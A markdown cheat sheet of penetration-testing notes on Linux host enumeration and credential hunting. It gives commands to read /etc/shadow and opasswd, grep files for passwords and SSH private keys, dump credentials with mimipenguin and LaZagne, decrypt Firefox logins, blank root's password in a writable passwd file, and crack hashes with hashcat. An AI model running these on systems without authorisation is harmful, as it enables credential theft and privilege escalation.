## Enumeration

### OS Version 
```shell
cat /etc/os-release   
```
### Kernel Version
```shell
uname -r 
```
### Path
```shell
echo $PATH
```
### Environmental Variables
```shell
env
```
### Running Services
```shell
systemctl --type=service --state=running
```
### Current processes
```shell
ps aux
```
### Logged on users
```shell
w
```
### User Home Directories
```shell
ls /home
```
### User Home directories contents
```shell
ls -la /home/<user>
```
### SSH Directory contents
```shell
ls -l ~/.ssh
```
### Bash History 
```shell
history
```
### Sudo Privileges 
```shell
sudo -l 
```
### Readable Shadow files
```shell
find / -name shadow 2>/dev/null
```
### etc/password
#### Look for password hashes
```shell
cat /etc/passwd
```
#### Users in file
```shell
cat /etc/passwd | cut -f1 -d:
```
### Users Last Login
```shell
lastlog
```
### Check for login shells
```shell
grep "*sh$" /etc/passwd
```
### Groups
```shell
cat /etc/group
```
#### List users in specific groups
```shell
getent group sudo
```
### Cron Jobs
```shell
crontab -l
```
```shell
ls -al /etc/cron.*/
```
### Unmounted File Systems and Additional Drives
```shell
lsblk
```
### SETUID, SETGID Permissions
```shell
find / -perm -4000 2>/dev/null ; find / perm -2000 2>/dev/null
```
### Writable Directories 
```shell
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
### Hidden Directories
```shell
find / -type d -name ".*" -ls 2>/dev/null
```
### Writable Files
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
### Hidden Files
```shell
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null  grep <username>
```
### History Files
```shell
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
### Temporary Files
* `/tmp` are deleted on reboot
* `/var/tmp` are kept for 30 days by default
```shell
ls -l /tmp /var/tmp /dev/shm
```
### CPU type/version
```shell
lscpu
```
### Shells
```shell
cat /etc/shells
```
### Check for defences
- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)
### Mounted and unmounted Drives
#### Unmouted
```shell
cat /etc/fstab | grep -v "#" | column -t
```
#### Mounted File systems
```shell
df -h
```
### Routing Table
```shell
route
```
```shell
netstat -rn
```
### Internal DNS (domain environment)
```shell
cat /etc/resolv.conf
```
### ARP table
```shell
arp -a
```
### Network Interfaces
```shell
ip a
```
### Hosts
```shell
cat /etc/hosts
```
### Proc
* [Proc file system](https://man7.org/linux/man-pages/man5/proc.5.html)
* Contains information about system processes, hardware and other system information.
* Virtual and does not exist as a real file system but is dynamically generated by the kernel.
```shell
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
### Install pages and versions
```shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

```shell
sudo -V
```
### Binaries 
```shell
ls -l /bin /usr/bin/ /usr/sbin/
```
#### GTFOBINS
```shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```
### Trace System calls
track and analyse system calls and signal processing. 
```shell
strace ping -c1 10.129.112.20
```
### Configuration Files
```shell
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
### Scripts 
```shell
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
## Credential Hunting

|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|||

### Files
#### Bash History 
```shell
 tail -n5 /home/*/.bash*
```

#### Config Files 
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
Passwords in config files
```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
#### Databases
```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
#### Notes
```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
#### Scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
#### Cronjobs
```shell
cat /etc/crontab 
```

```shell
 ls -la /etc/cron.*/
```

#### SSH Keys
Private Keys
```shell
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
Public Keys 
```shell
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### Logs
```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and Cache 
[Mimipenguin](https://github.com/huntergregal/mimipenguin)
```shell
 sudo python3 mimipenguin.py
```

LaZange
```shell
sudo python2.7 laZagne.py all
```
### Browsers 
Firefox 
```shell
ls -l .mozilla/firefox/ | grep default 
```

```shell
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
Decrypt Passwords 
[Firefox decrypt](https://github.com/unode/firefox_decrypt)
```shell
python3.9 firefox_decrypt.py
```

### Passwd, Shadow and Opasswd

Many use different authentication mechanisms. 
The most common is Plugable Authentication Modules. 
	pam_unix.so
	pam_unix2.so
	Located in /usr/lib/x86_x64-linux-gnu/security/ in Debian

pam_unix.so standard module for management uses standardised API calls from system libraries and files to update account information.  Files are read and updated are /etc/passwd and /etc/shadow.

#### #Passwd File

Contains existing user on the system and can be read by all users and services. 
Readable system wide
Each entry identifies a use on the system.

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|

Very rare for the hash to be encrypted in password information.
Most commonly stored in /etc/shadow

If the file is writable remove the password entry

```shell
root:x:0:0:root:/root:/bin/bash
```
```shell
root::0:0:root:/root:/bin/bash
```
```shell
su 
```

```shell
sudo cp /etc/passwd /tmp/passwd.bak 
```
#### #Shadow File 
Only contains passwords 

|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

```shell
sudo cat /etc/shadow
```
If the password contains a character such as ! or * the user cannot login with a Unix Password. Can still use other authentication methods such as Kerberos or key-based. 
#### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512
#### Cracking Shadow 

```shell
sudo cp /etc/shadow /tmp/shadow.bak 
```
```shell
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
```shell
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### #Opasswd

PAM can prevent old passwords being reused. 
Old passwords stored in /etc/security/opasswd.
Root is required to read the file if the permissions have not been changed manually. 

Passwords separated by a comma. 
```shell
sudo cat /etc/security/opasswd
```

